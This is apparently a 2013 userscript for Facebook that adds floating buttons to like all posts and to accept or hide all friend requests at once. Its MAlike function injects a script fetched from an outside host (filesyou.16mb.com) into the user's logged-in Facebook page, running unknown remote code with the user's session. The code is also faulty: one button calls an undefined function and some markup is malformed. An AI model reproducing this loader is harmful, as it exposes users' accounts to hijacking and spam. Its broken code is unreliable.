// ==UserScript==
// @name			[NEW] Facebook AutoLike MA V 0.1 
// @namespace		        http://userscripts.org/scripts/upload/+[id]+
// @version			0.1
// @copyright		        M.A.
// @description		        AutoLike And ConfirmFacebook 
// @author			M.A. (http://bit.ly/amyzyxrayevent)
// @icon			http://www.filesyou.16mb.com/uploads/1356281086.png
// @include			http://www.facebook.com/*
// @include			https://www.facebook.com/*
// @exclude			http://developers.facebook.com/*
// @exclude			https://developers.facebook.com/*
// Copyright (c) 2013, M.A.Licious
// Auto Like/Unlike, And Another Function.
// ==/UserScript==

// ==Profile==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like1');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity = 1.00;
	div.style.bottom = "+82px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#0FF000";
	div.style.border = "1px solid #CCFF00";
	div.style.padding = "2px";
	div.innerHTML = "<div style='background-color: #0FF000; color: #008E00; border: 1px solid #333333;'><center><a style='color: #0FF000;' <a href='http://bit.ly/amyzyxrayevent' title='Click to See M.A. Profile on Facebook'> M.A.Licious Profile </a></div>"
	div2 = document.createElement("div");
	div2.setAttribute('id','spoiler');
	div2.style.position = "fixed";
    div2.style.width = "125px";
	div2.style.opacity = 0.90;
	div2.style.bottom = "+2px";
	div2.style.left = "+6px";
	div2.style.backgroundColor = "#0FF000";
	div2.style.border = "1px solid #CCFF00";
	div2.style.padding = "2px";
	div2.innerHTML = "<div style='background-color: #0FF000; color: #008E00; border: 1px solid #333333;'><a style='color: #0FF000;' onclick='spoiler()' title='Click to Hidden Autolike'>&laquo;</a>&nbsp;<a href='http://bit.ly/ma-licious' target='_blank' title='MA-Autolike Version 0.1| Copyright 2013 | All Right Reserved' style='color: #FFFFFF;'>Autolike V 0.1</a> | <a style='color: #0FF000;' onclick='thanks()'>#</a></div>"
	
	body.appendChild(div);
	body.appendChild(div2);
	
	unsafeWindow.thanks = function() {
	alert("Thanks for installing this MA-Autolike :)\n\nMA\nCopyright (c) 2013");
	}
	unsafeWindow.spoiler = function() {
		var i;
	for(i=1;i<=20;i++) {
		var x=document.getElementById('like'+i);
		if (x.style.display=="none") {
		x.style.display="block";
		div2.style.width = "125px";
		div2.innerHTML ="<div style='background-color: #0FF000; color: #008E00; border: 1px solid #333333;'><a style='color: #0FF000;' onclick='spoiler()' title='Click to Hidden Autolike'>&laquo;</a>&nbsp;<a style='color: #FFFFFF;' href='http://bit.ly/ma-licious' target='_blank' title='MA-Autolike Version 0.1'>MA-Autolike V 0.1</a> | <a style='color: #0FF000;' onclick='thanks()'>#</a></div>"
		}
		else {
			x.style.display="none";
			div2.style.width = "7px";
			div2.innerHTML = "<a onclick='spoiler()' title='Click to Show Autolike'>&raquo;</a>"
		}
	}
	};
}

// ==Like All==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like2');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity = 0.90;
	div.style.bottom = "+62px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<img src='http://www.filesyou.16mb.com/uploads/1356265879.png' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a onclick='fajarlike()'>Like All</a>"
	
	body.appendChild(div);
	
	unsafeWindow.MAlike = function() {
    javascript: (a = (b = document).createElement("script")).src = "http://www.filesyou.16mb.com/js/forlike.js",
    b.body.appendChild(a);
    void(0);
    };
}

// ==Unlike All are Deprecated==
// ==Result for like goes here==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like3');
	div.style.position = "fixed";
	div.style.display = "block";
	div.style.width = "125px"; 
	div.style.opacity = 0.90;
	div.style.bottom = "+42px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#eceff5";
	div.style.border = "1px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<img src='http://www.filesyou.16mb.com/uploads/1356265879.png' width='16' height='14' align='absmiddle' />&nbsp;&nbsp;<a onclick='javascript:void(0);'>Liked:</a>"
	
	body.appendChild(div);
}

// ==Confirm All dan UnConfirm All==
body = document.body;
if(body != null) {
	div = document.createElement("div");
	div.setAttribute('id','like4');
	div.style.position = "fixed";
	div.style.display = "block"; 
	div.style.width = "125px";
	div.style.opacity = 0.90;
	div.style.bottom = "+22px";
	div.style.left = "+6px";
	div.style.backgroundColor = "#330099";
	div.style.border = "1px solid #94a3c4";
	div.style.padding = "2px";
	div.innerHTML = "<a onclick='OtomatisConfirm();' >Confirm All</a>&nbsp;|&nbsp;<a onclick='OtomatisAbaikan();' >Unconfirm All</a>"
	
	body.appendChild(div);
	function suspend(milliSeconds){
	var startTime = new Date().getTime(); 
	while (new Date().getTime() < startTime + milliSeconds); 
}
	unsafeWindow.OtomatisConfirm = function() {
		var x=document.getElementsByName("actions[accept]"); for (i=0;i<x.length;i++) { x[i].click();}
		};
		
	unsafeWindow.OtomatisAbaikan = function() {
			var x=document.getElementsByName("actions[hide]"); for (i=0;i<x.length;i++) { x[i].click();}
			};
}